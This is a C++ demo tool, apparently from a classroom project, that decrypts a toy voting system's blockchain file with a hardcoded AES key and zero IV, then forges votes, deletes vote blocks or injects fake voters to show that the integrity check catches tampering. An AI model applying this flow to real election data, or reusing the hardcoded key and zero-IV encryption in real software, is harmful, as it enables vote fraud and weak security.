#include<bits/stdc++.h>
#include<openssl/evp.h>
#include<openssl/sha.h>
using namespace std;

// same key the voting system uses
const string INTERNAL_KEY    = "VoteSys_AES_2024";
const string BLOCKCHAIN_FILE = "election_data.enc";
const string TAMPERED_FILE   = "election_data.enc";

string bytes_to_hex(const unsigned char* data, int len)
{
    ostringstream oss;
    for(int i=0; i<len; i++)
    {
        oss<<hex<<setw(2)<<setfill('0')<<(int)data[i];
    }
    return oss.str();
}

string sha256_hex(const string& data)
{
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char*)data.c_str(), data.size(), hash);
    return bytes_to_hex(hash, SHA256_DIGEST_LENGTH);
}

vector<unsigned char> aes_encrypt(const string& data, const string& key)
{
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[16]       = {0};
    unsigned char keyBytes[16] = {0};
    for(int i=0; i<(int)key.size()&&i<16; i++)
    {
        keyBytes[i]=key[i];
    }
    vector<unsigned char> output(data.size()+16);
    int len=0;
    int total=0;
    if(EVP_EncryptInit_ex(ctx,EVP_aes_128_cbc(),NULL,keyBytes,iv)!=1)
    {
        return {};
    }
    if(EVP_EncryptUpdate(ctx,output.data(),&len,(unsigned char*)data.c_str(),(int)data.size())!=1)
    {
        return {};
    }
    total=len;
    if(EVP_EncryptFinal_ex(ctx,output.data()+len,&len)!=1)
    {
        return {};
    }
    total+=len;
    EVP_CIPHER_CTX_free(ctx);
    output.resize(total);
    return output;
}

string aes_decrypt(const vector<unsigned char>& data, const string& key)
{
    if(data.empty())
    {
        return "DECRYPT_ERROR";
    }
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[16]       = {0};
    unsigned char keyBytes[16] = {0};
    for(int i=0; i<(int)key.size()&&i<16; i++)
    {
        keyBytes[i]=key[i];
    }
    vector<unsigned char> output(data.size()+16);
    int len=0;
    int total=0;
    if(EVP_DecryptInit_ex(ctx,EVP_aes_128_cbc(),NULL,keyBytes,iv)!=1)
    {
        EVP_CIPHER_CTX_free(ctx);
        return "DECRYPT_ERROR";
    }
    if(EVP_DecryptUpdate(ctx,output.data(),&len,data.data(),(int)data.size())!=1)
    {
        EVP_CIPHER_CTX_free(ctx);
        return "DECRYPT_ERROR";
    }
    total=len;
    if(EVP_DecryptFinal_ex(ctx,output.data()+len,&len)!=1)
    {
        EVP_CIPHER_CTX_free(ctx);
        return "DECRYPT_ERROR";
    }
    total+=len;
    EVP_CIPHER_CTX_free(ctx);
    return string(output.begin(), output.begin()+total);
}

int main()
{
    cout<<"\n======================================"<<endl;
    cout<<"   BLOCKCHAIN ATTACKER - Demo Tool"<<endl;
    cout<<"   (Educational Use Only)"<<endl;
    cout<<"======================================"<<endl;

    // Step 1: read all raw encrypted blocks from file
    ifstream infile(BLOCKCHAIN_FILE, ios::binary);
    if(!infile.is_open())
    {
        cout<<"[ERROR] Cannot open "<<BLOCKCHAIN_FILE<<endl;
        return 1;
    }

    vector<vector<unsigned char>> raw_blocks;
    int block_num=0;

    cout<<"\n[STEP 1] Reading blockchain file..."<<endl;
    while(true)
    {
        int s=0;
        if(!infile.read((char*)&s, sizeof(s)))
        {
            break;
        }
        if(s<=0||s>10000000)
        {
            break;
        }
        vector<unsigned char> enc(s);
        if(!infile.read((char*)enc.data(), s))
        {
            break;
        }
        raw_blocks.push_back(enc);
        block_num++;
    }
    infile.close();
    cout<<"[OK] Found "<<block_num<<" blocks."<<endl;

    // Step 2: decrypt and show all blocks
    cout<<"\n[STEP 2] Decrypting and showing all blocks..."<<endl;
    int target_index=-1;
    string old_vote_hash="";

    for(int i=0; i<(int)raw_blocks.size(); i++)
    {
        string dec=aes_decrypt(raw_blocks[i], INTERNAL_KEY);
        cout<<"  Block["<<i<<"] = "<<dec<<endl;
        if(dec.find("ANONYMOUS_VOTE|")==0)
        {
            target_index=i;
            old_vote_hash=dec.substr(15);
        }
    }

    // Step 3: ask attacker which block to tamper with
    cout<<"\n[STEP 3] ATTACK OPTIONS"<<endl;
    cout<<"1. Forge a vote (change ANONYMOUS_VOTE block)"<<endl;
    cout<<"2. Delete a vote block (remove from chain)"<<endl;
    cout<<"3. Inject a fake allowed voter"<<endl;
    cout<<"Choice: ";
    int choice;
    cin>>choice;

    if(choice==1)
    {
        // try to change who a vote went to
        if(target_index==-1)
        {
            cout<<"[FAIL] No ANONYMOUS_VOTE block found in chain."<<endl;
            return 1;
        }

        cout<<"\n[ATTACK] Found vote at block["<<target_index<<"]"<<endl;
        cout<<"[ATTACK] Current vote hash: "<<old_vote_hash<<endl;

        string fake_candidate;
        cout<<"Enter fake candidate name to forge vote for: ";
        cin.ignore(10000,'\n');
        getline(cin, fake_candidate);

        string fake_hash=sha256_hex("VOTE_SALT_"+fake_candidate);
        string fake_record="ANONYMOUS_VOTE|"+fake_hash;
        cout<<"[ATTACK] Replacing with forged hash for: "<<fake_candidate<<endl;

        // re-encrypt the tampered block
        vector<unsigned char> tampered=aes_encrypt(fake_record, INTERNAL_KEY);
        raw_blocks[target_index]=tampered;

        cout<<"[ATTACK] Vote block tampered in memory."<<endl;
    }
    else if(choice==2)
    {
        if(target_index==-1)
        {
            cout<<"[FAIL] No ANONYMOUS_VOTE block found."<<endl;
            return 1;
        }
        cout<<"[ATTACK] Removing vote block["<<target_index<<"] from chain..."<<endl;
        raw_blocks.erase(raw_blocks.begin()+target_index);
        cout<<"[ATTACK] Block deleted from memory."<<endl;
    }
    else if(choice==3)
    {
        string fake_voter_id;
        cout<<"Enter fake voter ID to inject: ";
        cin>>fake_voter_id;

        // hash the voter id the same way the system does
        string fake_hash=sha256_hex("VOTER_SALT_"+fake_voter_id);
        string fake_record="ALLOWED_VOTER|"+fake_hash;
        vector<unsigned char> injected=aes_encrypt(fake_record, INTERNAL_KEY);
        raw_blocks.push_back(injected);
        cout<<"[ATTACK] Fake voter injected at end of chain."<<endl;
    }
    else
    {
        cout<<"Invalid choice."<<endl;
        return 1;
    }

    // Step 4: write tampered data back to file
    cout<<"\n[STEP 4] Writing tampered data back to "<<TAMPERED_FILE<<"..."<<endl;
    ofstream outfile(TAMPERED_FILE, ios::trunc|ios::binary);
    if(!outfile.is_open())
    {
        cout<<"[ERROR] Cannot write to file."<<endl;
        return 1;
    }
    for(const auto& blk : raw_blocks)
    {
        int s=(int)blk.size();
        outfile.write((char*)&s, sizeof(s));
        outfile.write((char*)blk.data(), s);
    }
    
    outfile.flush();
    outfile.close();

    cout<<"[DONE] Tampered file written."<<endl;
    cout<<"\n======================================"<<endl;
    cout<<"RESULT: Run admin.exe -> Option 4"<<endl;
    cout<<"        'Verify Blockchain Integrity'"<<endl;
    cout<<"        It will detect the tamper!"<<endl;
    cout<<"======================================"<<endl;
    return 0;
}
